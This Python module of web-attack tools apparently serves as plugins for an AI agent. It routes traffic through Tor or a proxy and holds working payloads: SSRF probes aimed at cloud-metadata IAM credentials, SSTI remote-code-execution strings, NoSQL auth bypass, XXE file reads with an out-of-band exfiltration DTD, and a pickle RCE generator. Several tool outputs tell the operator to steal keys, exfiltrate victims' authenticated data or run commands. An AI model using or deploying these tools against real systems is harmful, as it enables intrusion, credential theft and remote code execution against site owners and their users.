"""Advanced web-attack weapons - the classes beyond the common SQLi/IDOR/XSS set:
server-side request forgery, CORS misconfiguration, server-side template injection
(engine-fingerprinted, with the RCE escalation), and NoSQL injection.

Each tool shares the authenticated web session (one cookie jar) and the active egress
(proxy/Tor) with the other web tools, so it operates as the logged-in user and stays
in-channel. They are evidence-first: a finding is a concrete signal in a response the
tool actually elicited (leaked internal content, a reflected arbitrary Origin, a
rendered arithmetic result), not a guess.
"""

from __future__ import annotations

import asyncio
import json
import re
import ssl
import time
import urllib.parse
from typing import Any, Optional

from browser.http_client import HttpClient
from browser.scraping_tools import WebSession
from plugins.sdk.base_tool import BaseTool, Permission, ToolResult

_UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
       "(KHTML, like Gecko) Chrome/124.0 Safari/537.36")


class _WebToolBase(BaseTool):
    """Shared plumbing: egress proxy + the persistent cookie jar."""

    name = "_web_advanced_base"  # placeholder; each concrete tool overrides it
    description = "advanced web-attack tool"
    parameters = {"type": "object", "properties": {}}

    def __init__(self, egress: Any = None, session: "Optional[WebSession]" = None,
                 **kwargs: Any) -> None:
        super().__init__(**kwargs)
        self.egress = egress
        self.session = session or WebSession()

    def _proxy(self) -> Any:
        return self.egress.httpx_proxy() if self.egress is not None else None

    def _client(self, timeout: float = 15.0) -> HttpClient:
        return HttpClient(timeout=timeout, proxy=self._proxy(),
                          cookies=getattr(self.session, "cookies", None),
                          headers={"User-Agent": _UA}, verify_ssl=False)

    @staticmethod
    def _inject(url: str, param: Optional[str], value: str) -> str:
        """Return `url` with `param` set to `value` (added if absent). With no param,
        the whole query value / a {PAYLOAD} marker is replaced."""
        if not param:
            if "{PAYLOAD}" in url:
                return url.replace("{PAYLOAD}", urllib.parse.quote(value, safe=""))
            return url
        parts = urllib.parse.urlsplit(url)
        q = dict(urllib.parse.parse_qsl(parts.query, keep_blank_values=True))
        q[param] = value
        return urllib.parse.urlunsplit(
            (parts.scheme, parts.netloc, parts.path,
             urllib.parse.urlencode(q), parts.fragment))


# --------------------------------------------------------------------------- #
# SSRF
# --------------------------------------------------------------------------- #

class SsrfProbeTool(_WebToolBase):
    """Probe a URL/parameter for Server-Side Request Forgery: make the server fetch
    internal targets (cloud metadata, loopback, alternate-encoded internal IPs, and
    file/gopher/dict schemes) and detect a leak of internal-only content. SSRF is the
    classic pivot to cloud-credential theft (IMDS) and internal service access."""

    name = "ssrf_probe"
    description = (
        "Test a URL parameter for SSRF by making the server fetch internal targets and "
        "detecting leaked internal content: cloud metadata (AWS/GCP/Azure IMDS - the "
        "path to instance IAM credentials), loopback + alternate-encoded internal IPs "
        "(127.0.0.1, 0177.0.0.1, 2130706433, [::1], 0.0.0.0), and file:// / gopher:// / "
        "dict:// schemes. Give the `url` and the `param` whose value is fetched "
        "server-side (e.g. url, uri, image, callback, webhook, next). Reports the "
        "payload that leaked internal data - a confirmed SSRF."
    )
    parameters = {
        "type": "object",
        "properties": {
            "url": {"type": "string", "description": "The endpoint, e.g. https://t/fetch?url=x"},
            "param": {"type": "string",
                      "description": "The server-fetched parameter (url/uri/image/callback/...)."},
        },
        "required": ["url", "param"],
    }
    permissions = {Permission.NETWORK}
    timeout = 45
    tags = ["web", "ssrf", "exploit"]

    # (label, payload, extra-headers, signature-regex proving an internal fetch)
    _PAYLOADS = [
        ("aws-imds-creds", "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
         {}, r"(?i)AccessKeyId|SecretAccessKey|Token|<role>|\b[A-Za-z0-9_-]{20,}"),
        ("aws-imds", "http://169.254.169.254/latest/meta-data/", {},
         r"(?i)ami-id|instance-id|hostname|iam|public-keys|security-credentials"),
        ("gcp-metadata", "http://metadata.google.internal/computeMetadata/v1/instance/",
         {"Metadata-Flavor": "Google"}, r"(?i)computeMetadata|service-accounts|numeric-project-id"),
        ("azure-imds", "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
         {"Metadata": "true"}, r"(?i)compute|azEnvironment|subscriptionId|vmId"),
        ("loopback-decimal", "http://2130706433/", {}, r"(?i)<html|server:|apache|nginx|root:x:"),
        ("loopback-octal", "http://0177.0.0.1/", {}, r"(?i)<html|server:|apache|nginx|root:x:"),
        ("loopback-ipv6", "http://[::1]/", {}, r"(?i)<html|server:|apache|nginx"),
        ("file-passwd", "file:///etc/passwd", {}, r"root:x:0:0:"),
        ("dict-redis", "dict://127.0.0.1:6379/info", {}, r"(?i)redis_version|used_memory|connected_clients"),
        ("gopher-localhost", "gopher://127.0.0.1:80/_GET / HTTP/1.0", {}, r"(?i)<html|server:"),
    ]

    async def execute(self, url: str, param: str, **kwargs: Any) -> ToolResult:
        url = (url or "").strip()
        param = (param or "").strip()
        if not url:
            return ToolResult.fail("ssrf_probe: 'url' is required")
        hits: list[str] = []
        tried = 0
        try:
            async with self._client(timeout=12.0) as client:
                # Baseline so we can tell a real internal leak from the app's own body.
                base = await client.get(self._inject(url, param, "http://example.com/"),
                                        extra_headers={"User-Agent": _UA})
                base_body = (base.text or "")[:4000]
                for label, payload, hdrs, sig in self._PAYLOADS:
                    tried += 1
                    target = self._inject(url, param, payload)
                    resp = await client.get(target, extra_headers={**hdrs, "User-Agent": _UA})
                    body = resp.text or ""
                    m = re.search(sig, body)
                    if m and m.group(0) not in base_body:
                        snippet = body[max(0, m.start() - 20):m.start() + 120].strip()
                        hits.append(f"  [{label}] payload={payload!r} status={resp.status_code}\n"
                                    f"    leaked: …{snippet}…")
        except Exception as exc:
            if not hits:
                return ToolResult.fail(f"ssrf_probe: request failed - {exc}")

        if not hits:
            return ToolResult.ok(
                f"ssrf_probe: no SSRF signal on {param!r} of {url} ({tried} payloads). The "
                "param may not be fetched server-side, or egress is filtered. Try another "
                "param (uri/image/callback/webhook/next) or a blind-SSRF collaborator.",
                metadata={"param": param, "hits": 0})
        return ToolResult.ok(
            "ssrf_probe: SSRF CONFIRMED - the server fetched an internal target and "
            f"leaked its content ({param!r} on {url}):\n" + "\n".join(hits) +
            "\n\nEscalate: for AWS, read /latest/meta-data/iam/security-credentials/<role> "
            "for temporary keys; for internal services, pivot with gopher:// (e.g. Redis).",
            metadata={"param": param, "hits": len(hits)})


# --------------------------------------------------------------------------- #
# CORS
# --------------------------------------------------------------------------- #

class CorsAuditTool(_WebToolBase):
    """Audit a URL's CORS policy for misconfigurations that let an attacker's page read
    authenticated responses cross-origin: a reflected arbitrary Origin, `null` origin
    trust, or unsafe subdomain/prefix/suffix matching - especially with
    Access-Control-Allow-Credentials: true."""

    name = "cors_audit"
    description = (
        "Audit a URL's CORS policy for exploitable misconfigurations. Sends crafted "
        "Origin headers (arbitrary attacker origin, null, a target subdomain, and "
        "prefix/suffix bypasses) and inspects Access-Control-Allow-Origin/-Credentials. "
        "Flags the critical case - the response reflects an arbitrary Origin AND allows "
        "credentials, so a malicious page can read the victim's authenticated data."
    )
    parameters = {
        "type": "object",
        "properties": {
            "url": {"type": "string", "description": "The endpoint to test (an authenticated API URL is best)."},
        },
        "required": ["url"],
    }
    permissions = {Permission.NETWORK}
    timeout = 25
    tags = ["web", "cors", "misconfig"]

    def _origins(self, url: str) -> list[tuple[str, str]]:
        host = urllib.parse.urlsplit(url).netloc or "target"
        base = host.split(":")[0]
        return [
            ("arbitrary", "https://evil.example"),
            ("null", "null"),
            ("subdomain", f"https://evil.{base}"),
            ("suffix", f"https://{base}.evil.example"),
            ("prefix", f"https://{base}evil.example"),
            ("scheme-downgrade", f"http://{base}"),
        ]

    async def execute(self, url: str, **kwargs: Any) -> ToolResult:
        url = (url or "").strip()
        if not url:
            return ToolResult.fail("cors_audit: 'url' is required")
        rows: list[str] = []
        critical: list[str] = []
        try:
            async with self._client() as client:
                for label, origin in self._origins(url):
                    resp = await client.get(url, extra_headers={"Origin": origin,
                                                                "User-Agent": _UA})
                    h = {k.lower(): v for k, v in (resp.headers or {}).items()}
                    acao = h.get("access-control-allow-origin", "")
                    acac = h.get("access-control-allow-credentials", "").lower() == "true"
                    reflected = acao == origin or (origin == "null" and acao == "null")
                    verdict = ""
                    if reflected and acac:
                        verdict = "  <-- CRITICAL: reflects this origin AND allows credentials"
                        critical.append(f"{label} ({origin})")
                    elif reflected:
                        verdict = "  <-- reflected origin (no creds; still a leak if data is unauthenticated)"
                    elif acao == "*" and acac:
                        verdict = "  <-- wildcard + credentials (invalid but some stacks honor it)"
                    rows.append(f"  Origin: {origin:32} -> ACAO={acao or '(none)'} "
                                f"ACAC={acac}{verdict}")
        except Exception as exc:
            return ToolResult.fail(f"cors_audit: request failed - {exc}")

        header = f"cors_audit - {url}\n" + "\n".join(rows)
        if critical:
            return ToolResult.ok(
                header + "\n\nCORS MISCONFIGURATION CONFIRMED (" + ", ".join(critical) +
                "): host a page on the accepted origin that fetches this URL with "
                "credentials:'include' and exfiltrates the response - it reads the "
                "victim's authenticated data cross-origin.",
                metadata={"url": url, "critical": len(critical)})
        return ToolResult.ok(header + "\n\nNo exploitable CORS misconfiguration found.",
                             metadata={"url": url, "critical": 0})


# --------------------------------------------------------------------------- #
# SSTI
# --------------------------------------------------------------------------- #

class SstiProbeTool(_WebToolBase):
    """Probe a parameter for Server-Side Template Injection, fingerprint the template
    engine from how it evaluates a polyglot, and hand back the engine-specific RCE
    payload. SSTI in a server-rendered template is a direct path to remote code
    execution."""

    name = "ssti_probe"
    description = (
        "Test a parameter for Server-Side Template Injection and fingerprint the engine. "
        "Sends arithmetic polyglots ({{7*7}}, ${7*7}, <%= 7*7 %>, #{7*7}, {{7*'7'}}) and "
        "detects a rendered result (49, or 7777777 for Jinja/Twig string-multiply), then "
        "returns the engine-specific RCE escalation (Jinja2/Twig/Freemarker/ERB/Velocity). "
        "Give `url`, the `param`, and for POST bodies set method/body."
    )
    parameters = {
        "type": "object",
        "properties": {
            "url": {"type": "string", "description": "The endpoint."},
            "param": {"type": "string", "description": "The parameter to inject."},
            "method": {"type": "string", "enum": ["GET", "POST"], "default": "GET"},
        },
        "required": ["url", "param"],
    }
    permissions = {Permission.NETWORK}
    timeout = 30
    tags = ["web", "ssti", "rce"]

    # (payload, marker-in-response, engine, rce)
    _PROBES = [
        ("{{7*'7'}}", "7777777", "Jinja2/Twig (Python/PHP)",
         "{{cycler.__init__.__globals__.os.popen('id').read()}}  (Jinja2) | "
         "{{['id']|filter('system')}}  (Twig)"),
        ("${7*7}", "49", "Freemarker/JSP-EL/Velocity",
         "${\"freemarker.template.utility.Execute\"?new()(\"id\")}  (Freemarker) | "
         "#set($e=$rt.exec('id'))  (Velocity)"),
        ("<%= 7*7 %>", "49", "ERB (Ruby)", "<%= `id` %>  or  <%= system('id') %>"),
        ("#{7*7}", "49", "Ruby #{} / Slim / Pug", "#{`id`}  or  #{system('id')}"),
        ("{{7*7}}", "49", "Jinja2/Twig/Angular", "see Jinja2/Twig RCE above"),
        ("${{7*7}}", "49", "smarty/other ${{}}", "engine-specific; confirm then escalate"),
    ]

    async def execute(self, url: str, param: str, method: str = "GET",
                      **kwargs: Any) -> ToolResult:
        url = (url or "").strip()
        param = (param or "").strip()
        if not url or not param:
            return ToolResult.fail("ssti_probe: 'url' and 'param' are required")
        method = (method or "GET").upper()
        findings: list[str] = []
        try:
            async with self._client() as client:
                for payload, marker, engine, rce in self._PROBES:
                    if method == "POST":
                        resp = await client.post(url, data={param: payload},
                                                 extra_headers={"User-Agent": _UA})
                    else:
                        resp = await client.get(self._inject(url, param, payload),
                                                extra_headers={"User-Agent": _UA})
                    if marker in (resp.text or ""):
                        findings.append(
                            f"  payload {payload!r} rendered {marker!r} -> engine: {engine}\n"
                            f"    RCE: {rce}")
                        break  # one confirmed engine is enough to escalate
        except Exception as exc:
            return ToolResult.fail(f"ssti_probe: request failed - {exc}")

        if not findings:
            return ToolResult.ok(
                f"ssti_probe: no SSTI on {param!r} of {url} - the value is not rendered "
                "through a server template (it may be reflected as plain text = XSS "
                "territory, or not reflected at all).",
                metadata={"param": param, "ssti": False})
        return ToolResult.ok(
            "ssti_probe: SSTI CONFIRMED (server evaluated the template expression):\n"
            + "\n".join(findings) +
            "\n\nSend the RCE payload in the same param to run a command; confirm with "
            "`id`/`whoami` in the response before reporting.",
            metadata={"param": param, "ssti": True})


# --------------------------------------------------------------------------- #
# NoSQL injection
# --------------------------------------------------------------------------- #

class NoSqliProbeTool(_WebToolBase):
    """Probe a login/query endpoint for NoSQL (MongoDB-style) injection: operator
    injection ($ne/$gt/$regex) that turns a value comparison into an always-true query -
    the NoSQL auth-bypass and blind-extraction primitive."""

    name = "nosqli_probe"
    description = (
        "Test a JSON or form endpoint for NoSQL (MongoDB) injection. Replaces the target "
        "field(s) with operator objects ({\"$ne\":null}, {\"$gt\":\"\"}, {\"$regex\":\".*\"}) "
        "and the form-encoded equivalents (field[$ne]=x), then diffs the response against "
        "a benign baseline - a changed/authenticated response signals the query was "
        "subverted (classic auth bypass). Give `url`, the `fields` to inject (e.g. "
        "username,password), and `body` as JSON for the baseline; set `form` for "
        "form-encoded bodies."
    )
    parameters = {
        "type": "object",
        "properties": {
            "url": {"type": "string", "description": "The endpoint (usually a login/query POST)."},
            "fields": {"type": "string",
                       "description": "Comma-separated fields to inject, e.g. 'username,password'."},
            "body": {"type": "object",
                     "description": "Baseline request body (benign values), e.g. {\"username\":\"x\",\"password\":\"y\"}."},
            "form": {"type": "boolean",
                     "description": "Send form-encoded instead of JSON (default false = JSON).",
                     "default": False},
        },
        "required": ["url", "fields"],
    }
    permissions = {Permission.NETWORK}
    timeout = 30
    tags = ["web", "nosqli", "exploit"]

    _OPS = [{"$ne": None}, {"$gt": ""}, {"$regex": ".*"}, {"$ne": "x"}]

    @staticmethod
    def _sig(resp: Any) -> tuple[int, int]:
        return (resp.status_code, len((resp.text or "")))

    async def execute(self, url: str, fields: str, body: Optional[dict] = None,
                      form: bool = False, **kwargs: Any) -> ToolResult:
        url = (url or "").strip()
        if not url:
            return ToolResult.fail("nosqli_probe: 'url' is required")
        flds = [f.strip() for f in (fields or "").split(",") if f.strip()]
        if not flds:
            return ToolResult.fail("nosqli_probe: 'fields' is required")
        base_body = dict(body or {f: "test" for f in flds})
        results: list[str] = []
        try:
            async with self._client() as client:
                baseline = await (client.post(url, data=base_body) if form
                                  else client.post(url, json=base_body))
                b_sig = self._sig(baseline)
                # Inject an operator into ALL target fields at once (classic auth bypass).
                for op in self._OPS:
                    if form:
                        data = dict(base_body)
                        for f in flds:
                            # field[$ne]=x style for form bodies
                            key = f + "[" + list(op.keys())[0] + "]"
                            data.pop(f, None)
                            data[key] = str(list(op.values())[0] if list(op.values())[0] is not None else "")
                        resp = await client.post(url, data=data, extra_headers={"User-Agent": _UA})
                    else:
                        payload = dict(base_body)
                        for f in flds:
                            payload[f] = op
                        resp = await client.post(url, json=payload, extra_headers={"User-Agent": _UA})
                    sig = self._sig(resp)
                    changed = sig != b_sig
                    op_s = json.dumps(op)
                    mark = "  <-- response CHANGED vs baseline (likely injectable)" if changed else ""
                    results.append(f"  {op_s:22} -> status={sig[0]} len={sig[1]}{mark}")
        except Exception as exc:
            return ToolResult.fail(f"nosqli_probe: request failed - {exc}")

        hit = any("CHANGED" in r for r in results)
        header = (f"nosqli_probe - {url}  fields={flds}\n"
                  f"  baseline               -> status={b_sig[0]} len={b_sig[1]}\n"
                  + "\n".join(results))
        if hit:
            return ToolResult.ok(
                header + "\n\nLIKELY NoSQL INJECTION: an operator object changed the "
                "query result - a {\"$ne\":null} on both auth fields is the classic "
                "MongoDB auth bypass. Confirm by checking for an authenticated response "
                "(token/redirect/user object), then extract blind with $regex.",
                metadata={"url": url, "injectable": True})
        return ToolResult.ok(
            header + "\n\nNo NoSQL-injection signal (responses matched the baseline). The "
            "backend may not be Mongo-style, or it coerces the operators to strings.",
            metadata={"url": url, "injectable": False})


# --------------------------------------------------------------------------- #
# HTTP request smuggling (front-end/back-end desync)
# --------------------------------------------------------------------------- #

class SmuggleProbeTool(_WebToolBase):
    """Detect HTTP request smuggling (front-end/back-end desync) with the timing
    technique: send crafted CL.TE / TE.CL / TE-obfuscation probes on a raw HTTP/1.1
    connection and flag the class whose probe hangs (the back-end waits for body bytes
    that never arrive) while a baseline request is fast. DETECTION ONLY - it does not
    smuggle a malicious request. Raw sockets, so it goes DIRECT (does not honor an
    egress proxy/Tor), and it can disturb a shared front-end, so use it only in scope."""

    name = "smuggle_probe"
    description = (
        "Detect HTTP request smuggling (CL.TE / TE.CL desync, plus Transfer-Encoding "
        "header-obfuscation TE.TE) with the timing technique: a probe that desyncs makes "
        "the back-end wait for body bytes that never arrive, so its response is delayed "
        "while a baseline request is fast. Give the `url`. DETECTION ONLY (no malicious "
        "request is smuggled). Uses a raw socket (goes direct, not via the egress proxy) "
        "and can disturb a shared front-end - run it only against an authorized target."
    )
    parameters = {
        "type": "object",
        "properties": {
            "url": {"type": "string", "description": "Target URL, e.g. https://t/ (a POST-able path)."},
        },
        "required": ["url"],
    }
    permissions = {Permission.NETWORK}
    timeout = 60
    tags = ["web", "smuggling", "desync"]

    _WAIT = 8.0  # per-probe response wait; a desync hangs to about here

    def _raw(self, host: str, path: str, headers: list[str], body: str) -> bytes:
        head = [f"POST {path} HTTP/1.1", f"Host: {host}", "Connection: close",
                "Content-Type: application/x-www-form-urlencoded", *headers]
        return ("\r\n".join(head) + "\r\n\r\n" + body).encode("latin-1", "ignore")

    async def _send(self, host: str, port: int, tls: bool, raw: bytes) -> float:
        """Send `raw`, return seconds until the first response byte (or the wait cap)."""
        ctx = None
        if tls:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
        start = time.monotonic()
        writer = None
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(host, port, ssl=ctx), timeout=self._WAIT)
            writer.write(raw)
            await writer.drain()
            try:
                await asyncio.wait_for(reader.read(1), timeout=self._WAIT)
            except asyncio.TimeoutError:
                return self._WAIT  # hung waiting for the body it was told to expect
            return time.monotonic() - start
        except asyncio.TimeoutError:
            return self._WAIT
        except Exception:
            return -1.0
        finally:
            if writer is not None:
                try:
                    writer.close()
                except Exception:
                    pass

    async def execute(self, url: str, **kwargs: Any) -> ToolResult:
        url = (url or "").strip()
        if not url:
            return ToolResult.fail("smuggle_probe: 'url' is required")
        parts = urllib.parse.urlsplit(url if "://" in url else "http://" + url)
        tls = parts.scheme == "https"
        host = parts.hostname or ""
        if not host:
            return ToolResult.fail("smuggle_probe: could not parse a host from the URL")
        port = parts.port or (443 if tls else 80)
        path = parts.path or "/"

        # Baseline: a well-formed request should answer quickly - take the faster of two.
        base_raw = self._raw(host, path, ["Content-Length: 0"], "")
        b1 = await self._send(host, port, tls, base_raw)
        b2 = await self._send(host, port, tls, base_raw)
        good = [t for t in (b1, b2) if t >= 0]
        if not good:
            return ToolResult.fail(
                f"smuggle_probe: could not reach {host}:{port} (connection failed).")
        baseline = min(good)

        # CL.TE: front uses Content-Length (4), back uses Transfer-Encoding -> back hangs
        # waiting for the chunk terminator.
        clte = self._raw(host, path, ["Transfer-Encoding: chunked", "Content-Length: 4"],
                         "1\r\nA\r\nX")
        # TE.CL: front uses Transfer-Encoding (0-chunk = done), back uses Content-Length
        # (6) and waits for bytes that were not forwarded.
        tecl = self._raw(host, path, ["Transfer-Encoding: chunked", "Content-Length: 6"],
                         "0\r\n\r\nX")
        # TE.TE: obfuscate one TE header so exactly one hop honors it.
        tete = self._raw(host, path,
                         ["Transfer-Encoding: chunked", "Transfer-Encoding: xchunked",
                          "Content-Length: 4"], "1\r\nA\r\nX")

        probes = [("CL.TE", clte), ("TE.CL", tecl), ("TE.TE (obfuscated)", tete)]
        rows: list[str] = []
        vulnerable: list[str] = []
        # A probe is a desync signal when it reaches the wait cap (the back-end hung
        # waiting for body bytes) AND is clearly slower than the fast baseline.
        cap = self._WAIT - 0.5
        for label, raw in probes:
            t = await self._send(host, port, tls, raw)
            if t < 0:
                rows.append(f"  {label:20} -> connection error")
                continue
            hung = t >= cap and t >= baseline * 2 + 0.5
            rows.append(f"  {label:20} -> {t:.1f}s"
                        + ("  <-- HUNG (desync signal)" if hung else ""))
            if hung:
                vulnerable.append(label)

        header = (f"smuggle_probe - {host}:{port}{path}\n"
                  f"  baseline (well-formed) -> {baseline:.1f}s "
                  f"(hang cap {cap:.1f}s)\n" + "\n".join(rows))
        if vulnerable:
            return ToolResult.ok(
                header + "\n\nLIKELY REQUEST SMUGGLING (" + ", ".join(vulnerable) + "): a "
                "desync probe hung while the baseline was fast. Confirm by re-running "
                "(timing can be noisy) and, in scope, escalate carefully - request "
                "smuggling can affect OTHER users of the shared front-end.",
                metadata={"host": host, "vulnerable": vulnerable})
        return ToolResult.ok(
            header + "\n\nNo desync signal (all probes answered near the baseline). Note "
            "timing detection has false negatives behind aggressive normalizers - a "
            "differential-response test is the follow-up.",
            metadata={"host": host, "vulnerable": []})


# --------------------------------------------------------------------------- #
# Prototype pollution (server-side)
# --------------------------------------------------------------------------- #

class ProtoPollutionTool(_WebToolBase):
    """Probe a JSON endpoint for server-side prototype pollution: inject __proto__ /
    constructor.prototype gadgets and detect a reflected/behavioural change (a polluted
    global property leaking into a later response, a new error, or a status change)."""

    name = "proto_pollution"
    description = (
        "Test a JSON endpoint for SERVER-SIDE prototype pollution (Node/JS backends). "
        "Sends __proto__ and constructor.prototype gadgets merged into the body, then a "
        "benign read, and flags a polluted property leaking into the response, a new 500, "
        "or a status/length change vs baseline. Give `url`, `body` (valid JSON), optional "
        "`read_url` to check for the leaked gadget afterwards."
    )
    parameters = {
        "type": "object",
        "properties": {
            "url": {"type": "string", "description": "JSON endpoint that merges the body."},
            "body": {"type": "object", "description": "A valid baseline JSON body."},
            "read_url": {"type": "string", "description": "Optional GET to check for the polluted gadget."},
        },
        "required": ["url"],
    }
    permissions = {Permission.NETWORK}
    timeout = 30
    tags = ["web", "prototype-pollution", "exploit"]

    _MARKER = "pp_polluted_9147"

    def _gadgets(self) -> list:
        return [
            {"__proto__": {"pp": self._MARKER}},
            {"constructor": {"prototype": {"pp": self._MARKER}}},
            {"__proto__": {"status": 510}},
        ]

    async def execute(self, url: str, body: Optional[dict] = None,
                      read_url: str = "", **kwargs: Any) -> ToolResult:
        url = (url or "").strip()
        if not url:
            return ToolResult.fail("proto_pollution: 'url' is required")
        base = dict(body or {})
        rows: list[str] = []
        hit = False
        try:
            async with self._client() as client:
                b = await client.post(url, json=base, extra_headers={"User-Agent": _UA})
                b_sig = (b.status_code, len(b.text or ""))
                for g in self._gadgets():
                    payload = {**base, **g}
                    resp = await client.post(url, json=payload, extra_headers={"User-Agent": _UA})
                    leaked = self._MARKER in (resp.text or "")
                    changed = (resp.status_code, len(resp.text or "")) != b_sig
                    check = ""
                    if read_url and not leaked:
                        r2 = await client.get(read_url, extra_headers={"User-Agent": _UA})
                        if self._MARKER in (r2.text or ""):
                            leaked, check = True, " (leaked into read_url)"
                    mark = ""
                    if leaked:
                        mark, hit = f"  <-- POLLUTED: gadget reflected{check}", True
                    elif changed and resp.status_code >= 500:
                        mark, hit = "  <-- server error after gadget (possible pollution)", True
                    rows.append(f"  {json.dumps(g)[:46]:48} -> status={resp.status_code} "
                                f"len={len(resp.text or '')}{mark}")
        except Exception as exc:
            return ToolResult.fail(f"proto_pollution: request failed - {exc}")

        header = f"proto_pollution - {url}\n" + "\n".join(rows)
        if hit:
            return ToolResult.ok(
                header + "\n\nLIKELY SERVER-SIDE PROTOTYPE POLLUTION: a gadget changed a "
                "global property. Escalate with a framework-specific gadget toward RCE or "
                "auth bypass.", metadata={"url": url, "polluted": True})
        return ToolResult.ok(header + "\n\nNo prototype-pollution signal (backend may not "
                             "be JS, or it clones/sanitizes the merge).",
                             metadata={"url": url, "polluted": False})


# --------------------------------------------------------------------------- #
# XXE
# --------------------------------------------------------------------------- #

class XxeTool(_WebToolBase):
    """XML External Entity injection: submit XXE payloads (file read, SSRF, PHP wrapper,
    and a blind/OOB external-DTD stub) to an XML endpoint and detect a leaked file or an
    internal fetch."""

    name = "xxe_tool"
    description = (
        "Test an XML endpoint for XXE. POSTs file-read (file:///etc/passwd), PHP base64 "
        "wrapper, and SSRF (IMDS) entity payloads and flags leaked file content or an "
        "internal fetch; also returns an out-of-band blind stub (external DTD). Give "
        "`url`; set `file` for a specific path and `oob_url` for a blind collaborator."
    )
    parameters = {
        "type": "object",
        "properties": {
            "url": {"type": "string", "description": "The XML-consuming endpoint."},
            "file": {"type": "string", "description": "File to read (default /etc/passwd).", "default": "/etc/passwd"},
            "oob_url": {"type": "string", "description": "Optional attacker URL for a blind external DTD."},
        },
        "required": ["url"],
    }
    permissions = {Permission.NETWORK}
    timeout = 30
    tags = ["web", "xxe", "exploit"]

    async def execute(self, url: str, file: str = "/etc/passwd", oob_url: str = "",
                      **kwargs: Any) -> ToolResult:
        url = (url or "").strip()
        if not url:
            return ToolResult.fail("xxe_tool: 'url' is required")
        file = file or "/etc/passwd"
        payloads = [
            ("file-read",
             f'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file://{file}">]>'
             f'<r>&xxe;</r>', r"root:x:0:0:"),
            ("php-b64",
             '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM '
             f'"php://filter/convert.base64-encode/resource={file}">]><r>&xxe;</r>',
             r"[A-Za-z0-9+/]{40,}={0,2}"),
            ("ssrf-imds",
             '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM '
             '"http://169.254.169.254/latest/meta-data/">]><r>&xxe;</r>',
             r"(?i)ami-id|instance-id|iam|security-credentials"),
        ]
        hits: list[str] = []
        try:
            async with self._client() as client:
                for label, body, sig in payloads:
                    resp = await client.request(
                        "POST", url, content=body,
                        extra_headers={"Content-Type": "application/xml", "User-Agent": _UA})
                    m = re.search(sig, resp.text or "")
                    if m:
                        snip = (resp.text or "")[max(0, m.start() - 10):m.start() + 100].strip()
                        hits.append(f"  [{label}] status={resp.status_code} leaked: …{snip}…")
        except Exception as exc:
            if not hits:
                return ToolResult.fail(f"xxe_tool: request failed - {exc}")

        oob = ""
        if oob_url:
            oob = ("\n\nBLIND/OOB - host this external DTD and reference it:\n"
                   f'  in-band ref: <!DOCTYPE r [<!ENTITY % ext SYSTEM "{oob_url}/e.dtd">%ext;]>\n'
                   f'  e.dtd: <!ENTITY % f SYSTEM "file://{file}"><!ENTITY % all '
                   f'"<!ENTITY send SYSTEM \'{oob_url}/?x=%f;\'>">%all;')
        if hits:
            return ToolResult.ok(
                "xxe_tool: XXE CONFIRMED - the parser resolved an external entity:\n"
                + "\n".join(hits) + oob, metadata={"url": url, "xxe": True})
        return ToolResult.ok(
            f"xxe_tool: no in-band XXE leak on {url} (parser may block external entities)."
            + oob, metadata={"url": url, "xxe": False})


# --------------------------------------------------------------------------- #
# Insecure deserialization (offline payload generator)
# --------------------------------------------------------------------------- #

class DeserializeGadgetTool(BaseTool):
    """Generate insecure-deserialization payloads / gadget guidance: Python pickle (a
    working RCE), Node node-serialize, PHP object-injection + phar, Java (ysoserial
    gadget selection), .NET Json.NET TypeNameHandling. Offline."""

    name = "deserialize_gadget"
    description = (
        "Generate an insecure-deserialization payload for a language: 'python' (working "
        "pickle RCE), 'node' (node-serialize IIFE), 'php' (object-injection + phar), "
        "'java' (which ysoserial gadget), '.net' (Json.NET ObjectDataProvider). Give "
        "`lang` and the `cmd` to run. Offline - send the output at the deserialization sink."
    )
    parameters = {
        "type": "object",
        "properties": {
            "lang": {"type": "string", "enum": ["python", "node", "php", "java", ".net"],
                     "description": "Target language/serializer."},
            "cmd": {"type": "string", "description": "Command to execute (default 'id').", "default": "id"},
        },
        "required": ["lang"],
    }
    permissions: set = set()
    tags = ["web", "deserialization", "rce"]

    async def execute(self, lang: str, cmd: str = "id", **kwargs: Any) -> ToolResult:
        import base64 as _b64
        lang = (lang or "").lower().strip()
        cmd = cmd or "id"
        if lang == "python":
            import pickle
            import os as _os

            class _R:
                def __reduce__(self):
                    return (_os.system, (cmd,))
            b64 = _b64.b64encode(pickle.dumps(_R())).decode()
            return ToolResult.ok(
                "Python pickle RCE payload (base64) - the sink runs os.system on load:\n"
                f"  {b64}\n\nUse at any pickle.loads()/yaml.load(Loader=Loader)/jsonpickle "
                "sink.", metadata={"lang": "python"})
        if lang == "node":
            payload = ('{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\')'
                       f'.exec(\'{cmd}\');}}()"}}')
            return ToolResult.ok(
                "Node node-serialize RCE (IIFE runs on unserialize):\n  " + payload,
                metadata={"lang": "node"})
        if lang == "php":
            return ToolResult.ok(
                "PHP object injection / phar:\n"
                "  - Object injection: O:<len>:\"Class\":<n>:{...} matching a class with a "
                "dangerous __wakeup/__destruct (build a POP chain).\n"
                f"  - phar:// deserialization: craft a phar whose metadata is a POP-chain "
                f"object running {cmd!r}; trigger via a filesystem func on phar://.",
                metadata={"lang": "php"})
        if lang == "java":
            return ToolResult.ok(
                "Java deserialization - pick the ysoserial gadget for the classpath:\n"
                "  CommonsCollections1-7, CommonsBeanutils1, Spring1/2, Groovy1, "
                "Hibernate1, JRMPClient (OOB), URLDNS (blind detect).\n"
                f"  java -jar ysoserial.jar <GADGET> {cmd!r} | base64  -> ObjectInputStream "
                "sink. Detect first with URLDNS.", metadata={"lang": "java"})
        if lang == ".net":
            return ToolResult.ok(
                ".NET Json.NET with TypeNameHandling != None:\n"
                "  {\"$type\":\"System.Windows.Data.ObjectDataProvider,...\",...}  "
                f"(ysoserial.net -f Json.Net -g ObjectDataProvider -c \"{cmd}\").",
                metadata={"lang": ".net"})
        return ToolResult.fail("deserialize_gadget: lang must be python|node|php|java|.net")


# --------------------------------------------------------------------------- #
# Web cache poisoning
# --------------------------------------------------------------------------- #

